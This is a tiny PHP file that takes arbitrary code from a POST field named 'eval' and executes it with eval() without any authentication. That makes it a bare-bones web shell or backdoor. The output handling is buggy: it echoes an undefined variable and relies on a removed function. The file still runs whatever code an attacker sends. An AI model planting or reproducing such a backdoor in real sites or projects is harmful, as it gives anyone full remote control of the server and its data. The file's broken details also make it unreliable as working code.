<?php
$eval = $_POST['eval'];
if (!empty($eval)) 
{ 
    echo "<b>Result of execution this PHP-code</b>:<br>"; 
    eval($eval); 
    $ret = ob_get_contents(); 
    $ret = convert_cyr_string($ret,"d","w"); 
    ob_clean(); 
    echo $tmp; 
    
} 
  
?>